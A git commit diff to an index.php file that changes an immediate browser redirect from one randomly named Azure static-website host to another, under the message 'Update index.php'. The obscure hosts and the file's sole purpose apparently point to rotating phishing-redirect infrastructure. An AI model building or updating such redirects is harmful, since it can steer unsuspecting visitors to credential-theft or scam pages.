75649fd7a40691450c29c031c69c7270446092dc
mancillajoaquin204 <mancillajoaquin204@gmail.com>
2025-02-12 23:31:51 +0530

    Update index.php

--- index.php
+++ index.php
@@ -2,7 +2,7 @@
 <?php
  
 // Redirect browser
-header("Location: https://corefxx9i8wase3.z5.web.core.windows.net/wdewqws/index.html");
+header("Location: https://jewell3edssers.z8.web.core.windows.net/");
  
 exit;
 ?>
